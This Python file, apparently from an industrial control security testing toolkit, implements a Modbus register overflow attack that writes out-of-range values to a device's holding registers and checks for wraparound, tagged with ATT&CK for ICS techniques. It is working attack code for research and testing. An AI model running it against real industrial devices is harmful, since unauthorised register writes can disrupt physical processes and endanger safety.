#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
import time
import logging
from .attack_result import AttackResult
from .attack_mapping import get_attack_techniques
from .validation import ModbusValidator

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

class ModbusOverflowAttacker:
    def __init__(self, host='localhost', port=502, unit_id=1):
        self.host = host
        self.port = port
        self.unit_id = unit_id
        self.client = None

    def connect(self):
        """Establish connection to Modbus server"""
        try:
            self.client = ModbusTcpClient(self.host, port=self.port)
            if self.client.connect():
                logger.info(f"Connected to Modbus server at {self.host}:{self.port}")
                return True
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def read_register_value(self, address, log_output=True):
        """Read the current value of a register"""
        try:
            result = self.client.read_holding_registers(address=address, count=1, device_id=self.unit_id)
            if not result.isError():
                return result.registers[0]
            return None
        except Exception as e:
            if log_output:
                logger.error(f"Failed to read register {address}: {e}")
            return None

    def attempt_overflow(self, address, value, log_output=True):
        """Attempt to write an overflow value to a register"""
        try:
            if log_output:
                logger.info(f"\nAttempting overflow attack on register {address}")
                logger.info(f"Attempting to write value: {value} (0x{value:04X})")

            # Read initial value
            initial_value = self.read_register_value(address, log_output=log_output)
            if initial_value is not None and log_output:
                logger.info(f"Initial register value: {initial_value} (0x{initial_value:04X})")

            # Attempt to write overflow value
            write_response = self.client.write_register(address, value, device_id=self.unit_id)

            if write_response and not write_response.isError():
                if log_output:
                    logger.info("Write operation succeeded")

                # Read the value after write
                new_value = self.read_register_value(address, log_output=log_output)
                if new_value is not None:
                    if log_output:
                        logger.info(f"New register value: {new_value} (0x{new_value:04X})")

                        # Check for overflow effects
                        if new_value != value:
                            logger.info("Overflow detected! Value wrapped around")

                    return {
                        'success': True,
                        'initial_value': initial_value,
                        'new_value': new_value,
                        'overflow_detected': (new_value != value)
                    }
                return {'success': True, 'initial_value': initial_value, 'new_value': None, 'overflow_detected': False}
            else:
                if log_output:
                    logger.error("Write operation failed")
                return {'success': False, 'initial_value': initial_value, 'new_value': None, 'overflow_detected': False}

        except Exception as e:
            if log_output:
                logger.error(f"Overflow attack failed: {e}")
            return {'success': False, 'error': str(e)}

    def execute(self, start=0, test_values=None):
        """
        Execute overflow attack and return structured result.

        Args:
            start: Starting address for overflow test (default: 0)
            test_values: List of values to test (default: [65536, -1])

        Returns:
            AttackResult with overflow test results
        """
        if test_values is None:
            test_values = [65536, -1]

        # Validate start address and unit_id
        valid, msg = ModbusValidator.validate_address(start)
        if not valid:
            return AttackResult(
                attack='overflow',
                target={'host': self.host, 'port': self.port, 'unit_id': self.unit_id},
                params={'start': start, 'test_values': test_values},
                success=False,
                timestamp=AttackResult.create('overflow', self.host, self.port, self.unit_id).timestamp,
                error=f"Validation failed: {msg}"
            )

        valid, msg = ModbusValidator.validate_unit_id(self.unit_id)
        if not valid:
            return AttackResult(
                attack='overflow',
                target={'host': self.host, 'port': self.port, 'unit_id': self.unit_id},
                params={'start': start, 'test_values': test_values},
                success=False,
                timestamp=AttackResult.create('overflow', self.host, self.port, self.unit_id).timestamp,
                error=f"Validation failed: {msg}"
            )

        result = AttackResult.create(
            'overflow', self.host, self.port, self.unit_id,
            params={'start': start, 'test_values': test_values}
        )

        try:
            if not self.connect():
                result.error = "Failed to connect to Modbus server"
                return result

            test_results = []
            descriptions = {
                65536: "Overflow 16-bit value",
                -1: "Negative value"
            }

            for value in test_values:
                test_info = {
                    'address': start,
                    'value': value,
                    'description': descriptions.get(value, f"Test value {value}")
                }

                attempt_result = self.attempt_overflow(start, value, log_output=False)
                test_info.update(attempt_result)
                test_info['write_success'] = attempt_result.get('success', False)

                test_results.append(test_info)
                time.sleep(0.5)  # Prevent overwhelming the server

            result.data['tests'] = test_results
            self.client.close()
            result.success = True

        except Exception as e:
            result.error = str(e)
            if self.client:
                self.client.close()

        # Populate ATT&CK for ICS technique mapping
        techniques = get_attack_techniques('overflow')
        if techniques:
            result.attack_technique = techniques[0] if len(techniques) == 1 else {'techniques': techniques}

        return result

    def run_overflow_attack(self):
        """Execute a series of overflow attacks (backward compatibility)"""
        if not self.connect():
            logger.error("Failed to connect to Modbus server")
            return
        logger.info("\nStarting Register Overflow Attack simulation...")

        # Test cases for overflow attempts
        test_cases = [
            (0, 65536, "Overflow 16-bit value"),
            (0, -1, "Negative value")
        ]

        for address, value, description in test_cases:
            logger.info(f"\nTest Case: {description}")
            self.attempt_overflow(address, value)
            time.sleep(0.5)  # Prevent overwhelming the server

        self.client.close()
        logger.info("\nOverflow attack simulation completed")

if __name__ == "__main__":
    attacker = ModbusOverflowAttacker()
    attacker.run_overflow_attack()